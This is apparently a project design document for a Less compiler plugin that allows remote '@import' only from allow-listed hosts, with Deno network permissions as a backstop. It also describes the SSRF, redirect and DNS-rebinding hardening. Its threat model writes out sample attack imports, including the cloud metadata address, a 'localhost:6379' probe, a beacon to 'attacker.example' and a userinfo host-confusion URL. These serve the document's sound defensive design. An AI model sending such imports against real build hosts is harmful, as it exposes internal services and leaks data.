# Remote (network) imports behind an explicit, runtime-enforced allowlist

> **Built.** `@jesscss/plugin-remote-import` (`packages/jess-plugin-remote-import`)
> fetches `@import "https://host/x.less"` from an explicit host allow list. It is
> opt-in: without it a URL import is a CSS terminal and nothing is fetched. The
> design was proposed in jesscss/jess#219; the owner's rulings on its open
> questions (2026-10-04) are folded in below and listed in §8.

Related code: `packages/core/src/plugin.ts` (the `canResolveImport → resolve →
locate → getSource` contract), `packages/core/src/context.ts` (`loadImport`,
`_getPath`, `getTree`), `packages/jess-plugin-remote-import/src/index.ts`.

## 0. The idea in one line

A remote import is enabled only when the caller names the exact hosts it trusts,
and on Deno that trust is also enforced by the **runtime network permission** —
so a buggy resolver still cannot reach a host the caller didn't allow.

## 1. Why this is a policy question, not just a feature

Fetching an `@import` URL turns the compiler into an HTTP client that runs
wherever the build runs — a laptop, CI, a server rendering user-supplied Less.
The failure modes are the standard ones for "server fetches a URL":

- **SSRF**: `@import "http://169.254.169.254/latest/meta-data/..."` or
  `http://localhost:6379/` reaches cloud metadata / internal services from the
  build host.
- **Exfiltration / tracking**: `@import "https://attacker.example/beacon.less"`
  phones home with whatever is in the request (and the build's egress IP).
- **Supply-chain**: a trusted CDN host that later serves malicious content, or a
  redirect from a trusted host to an untrusted one.

So the default is **off**, and "on" is never "fetch anything" — it is "fetch
from *these* hosts."

## 2. Default and opt-in surface

**Default: no network.** No plugin in the default stack claims a URL import, so
— per the `canResolveImport` contract in `plugin.ts` — it stays a CSS terminal.
`@jesscss/plugin-less` used to claim `https://cdn.jsdelivr.net/npm/<pkg>/…`
imports and answer them from a locally installed `<pkg>`; that substitution was
removed with this plugin, so the default stack claims no URL at all and a
jsDelivr URL is a terminal like any other.

**Opt-in:** add the plugin with an allow list through the existing
`compile.plugins` option — in a `styles.config.*` file (read by the `jess` CLI,
the `Compiler` API and the Less wrapper alike) or the `Compiler` constructor:

```js
// styles.config.mjs
import { remoteImportPlugin } from '@jesscss/plugin-remote-import';

export default {
  compile: {
    plugins: [
      remoteImportPlugin({
        allow: ['cdn.example.com', 'design-tokens.example.com'],
        // defaults: maxBytes 512 KiB, timeout 5000 ms
      })
    ]
  }
};
```

There is no CLI flag; the config file is the one configuration mechanism, as it
is for every other plugin.

An empty or absent `allow` is a hard error at construction. Each entry is a
bare host spelled as a URL prints it (lowercase, punycode for an IDN): no
wildcard (`*` is rejected), no scheme, port, path or credentials, and never a
private, loopback or link-local IP address.

## 3. Where it slots into the engine

The plugin implements the existing import capabilities (`plugin.ts`), the same
shape as `plugin-node-modules`:

| Capability | Behavior |
| --- | --- |
| `canResolveImport(specifier)` | `false` for anything that is not an `http:`/`https:`/protocol-relative URL, and for an extensionless URL (an endpoint such as `https://fonts.googleapis.com/css?family=…`, which stays a CSS terminal). For a URL naming a file: `true` when it is `https:` and its host is on `allow`; otherwise it **throws** (§6). No request is made. |
| `resolve` / `expandImport` | Not implemented: a URL passes through unchanged. Core no longer expands a URL into `.less`/`_partial` candidates — expansion is filesystem probing, and a URL names exactly one resource. |
| `locate` | Returns the first candidate that is an allowed `https:` URL (protocol-relative normalized to `https:`). Never a request. |
| `getSource(url)` | The **only** method that touches the network (§5). Context asks the plugin whose `locate` returned the path, so a filesystem plugin's `getSource` is never handed a URL. |

Because `canResolveImport` gates entry to the pipeline, a host off the list is
rejected *before* resolve/locate/getSource — the fetch code is never reached for
a disallowed host. That is the app-level check. §4 is what makes it hold on
Deno even if the app-level check is wrong.

Two core rules make the route sound for documents that were themselves fetched:

- **An import inside a remote document is relative to that document's URL.**
  Context rebases it (`new URL(specifier, importerUrl)`) before the claim gate,
  so `@import "vars.less"` in `https://cdn.example.com/theme/main.less` asks for
  `https://cdn.example.com/theme/vars.less` and passes the same allow list. A
  remote document can never name a local file: `@import "/etc/x.less"` in it is
  `https://cdn.example.com/etc/x.less`.
- **A URL keeps its query.** The query is part of which resource a server
  returns (`theme.less?v=2`), so it stays in the source identity and the
  request; only the `#fragment` is dropped. A file path still drops both.

`@use` / `@compose` of a URL reach the same `loadImport` route, so they pass the
same claim gate and allow list (see §8, item 5).

## 4. The enforcement boundary — Deno `--allow-net`

App-level host checks are necessary but not sufficient: a bug in our own
normalization (parsing `https://cdn.example.com@evil.example/…`, an
unnormalized IDN, a redirect we forgot to re-check) could route a fetch to a
host the caller never allowed. The runtime permission is the backstop that
holds even when our code is wrong.

- **Deno**: run with `--allow-net=<the same hosts>`. `fetch()` to any other host
  fails with the runtime's capability error (`Deno.errors.NotCapable` in Deno 2;
  `PermissionDenied` before it) before a socket opens, and Deno's own DNS lookup
  is permission-checked too (it fails with `EPERM`). A redirect that Deno follows
  itself is re-checked per hop.
- **Node**: Node has no stable per-host network permission. On Node the allow
  list is enforced **only** at the app level (§3, §5). **Node gives you the
  allow list; Deno gives you the allow list *and* a runtime guarantee.**

The plugin does not grant itself permission and does not launch Deno; whoever
runs the compiler under Deno passes `--allow-net` with the same list as `allow`.
If a host is in `allow` but not in `--allow-net`, the fetch is denied
(fail-closed).

## 5. Hardening applied to every allowed fetch

- **https only.** An `http:` URL is refused, even on an allowed host.
- **No cross-host redirects.** Redirects are followed by the plugin
  (`redirect: 'manual'`), at most five, and only while the origin (scheme, host
  and port) stays the same. A redirect to another origin — including another
  allowed host, plain `http:`, or another port — is refused without a request.
- **Private addresses are never reached.** An allow entry that is a private,
  loopback, link-local, shared (CGNAT) or unspecified address is rejected at
  construction (`0/8`, `10/8`, `100.64/10`, `127/8`, `169.254/16`, `172.16/12`,
  `192.168/16`, `::`, `::1`, `fc00::/7`, `fe80::/10`, and IPv4-mapped IPv6 of
  those). The default transport also resolves an allowed hostname before the
  request and refuses it when any answer is in those ranges. That check runs
  before `fetch` connects, so a DNS answer that changes in between (rebinding)
  is not caught; pinning the socket to the checked address needs a custom
  dispatcher.
- **Size and time caps.** `maxBytes` (default 512 KiB) refuses a declared
  `Content-Length` over the cap and aborts a streamed body that passes it.
  `timeout` (default 5000 ms) bounds the whole import — every redirect and the
  body.
- **Transport.** `fetch` is injectable (`(url, { redirect, signal }) =>
  Promise<Response>`). A replacement takes over the request *and* the resolved
  address check; the allow list, https, redirect, size and time rules stay with
  the plugin.
- **Caching.** Each URL is fetched once per compile (Context caches imports by
  identity). There is no lockfile or integrity pinning (§8, item 3).

## 6. A blocked host is an error

With the plugin configured, `@import "https://not-allowed.example/x.less"` is a
compile error (`import/load-failed`, "… is not on the remote-import allow
list"), not a CSS terminal: configuring the plugin asks for remote sources to be
inlined, so a host off the list is a mistake to report. `(optional)` does not
suppress it — `optional` covers a missing file, not a refused one. Without the
plugin, the same import is a CSS terminal, as before.

## 7. The proof: a test that shows Deno *denies* an off-list host

`packages/jess-plugin-remote-import/test/deno-net-denial.test.ts` runs
`test/deno/net-denial.ts` under `deno run --allow-net=allowed.invalid,127.0.0.1`.
In that script the plugin's own allow list admits **both** `allowed.invalid`
and `denied.invalid`, so the app-level check is out of the way, and:

- with Deno's raw `fetch` as the transport (no DNS guard either), a fetch of
  `https://denied.invalid/…` fails with the runtime's capability error — the
  error identity is checked, not our message;
- the same through the shipped default transport fails at Deno's
  permission-checked DNS lookup;
- `https://allowed.invalid/…` gets past the runtime (it fails only because
  `.invalid` never resolves) — the positive control showing the denial is per
  host, not a blanket network ban;
- a loopback server answering `302 → https://denied.invalid/…` makes a
  runtime-followed redirect fail at the hop.

Run with an unrestricted `--allow-net`, the first probe reaches the network and
the test fails; that is what makes it a proof. Deno is found on `PATH` first,
then the binary of the `deno` devDependency (the order `@jesscss/plugin-js`
uses); the test is skipped, with that reason, only when neither runs.

The Node side — allow/deny at the claim, https-only, same- and cross-origin
redirects, redirect limit, size cap (declared and streamed), timeout, private
allow entries, and a hostname resolving to loopback — is covered by
`test/remote-import.test.ts` with an injected transport; no test makes a real
network request.

The Less corpus fixture `tests-unit/import/import-remote.less` is a gate: the
all-less harness configures the plugin with `allow: ['cdn.jsdelivr.net']` and a
transport that answers `https://cdn.jsdelivr.net/npm/@less/test-data/<file>`
from the local checkout. It proves remote `(reference)` imports (a query
included) render like 4.x through the real claim → locate → fetch → parse
route; it proves nothing about network I/O, which the tests above own.

## 8. Rulings and open questions

Owner rulings, 2026-10-04 (applied above):

1. **Blocked host** when the plugin is configured: **error** (§6).
2. **IP hosts**: private, loopback and link-local addresses are **denied** (§5).
3. **https only**; **no cross-host redirects**; **size and time caps** with
   defaults of 512 KiB and 5 s (§5).

Still open for the owner:

3. **Reproducibility**: a lockfile / SRI-style integrity for remote imports, or
   content-addressed caching. Not built.
4. **CLI**: no `--remote-import-host`-style flag; the plugin is configured
   through `compile.plugins` like every other plugin. The Less wrapper
   (`less.render`, `lessc`) reads the same `styles.config.*`, but its `plugins`
   option still takes Less 4.x plugins only.
5. **`@use` / `@compose` over the network** share this allow list today, because
   they reach the same import route. Whether module imports should get their
   own policy is undecided.
6. **Extensionless URLs** stay CSS terminals even with the plugin (so
   Google-Fonts-style endpoints never error). Less 4.x would fetch
   `https://host/theme` as `theme.less`; whether to follow it is undecided.

Not built: `(inline)` of a remote URL (`readBinary` reads the filesystem only),
and URL rewriting (`rewriteUrls`/`rootpath`) for `url()` values inside a fetched
document.
